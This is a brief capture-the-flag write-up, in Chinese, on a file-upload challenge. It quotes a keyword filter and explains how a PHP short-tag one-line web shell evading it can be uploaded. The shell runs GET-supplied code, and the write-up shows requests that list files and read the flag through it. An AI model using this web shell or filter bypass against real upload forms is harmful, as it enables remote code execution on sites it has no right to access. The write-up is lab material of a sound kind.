![image-20240316145955349](https://pic.imgdb.cn/item/65f544f09f345e8d03f0afaf.png)

简单的文件上传

```php
$allowedExts = array("gif", "jpeg", "jpg", "png", "php");
    if (strpos($fileContent, "php") !== false || strpos($fileContent, "post") !== false) {
        echo "<div style='background-color: #ffcccc; padding: 10px; border: 1px solid #ff0000;'>上传文件内容包含非法关键字</div>";
    }
```

挑了重点代码

允许图片和php文件上传

但是检测了文件内容里面不能包含 php 和 post关键字

避免php可以使用短标签

避免post可以使用get

于是一句话木马这样写：

```php
<?= eval($_GET['123']);?>
```

上传成功

![image-20240316150458068](https://pic.imgdb.cn/item/65f544fb9f345e8d03f0ef5e.png)

执行命令

```
http://xxx/upload/cmd.php?123=system('ls');
http://xxx/upload/cmd.php?123=system('cat /flag');
```

得到flag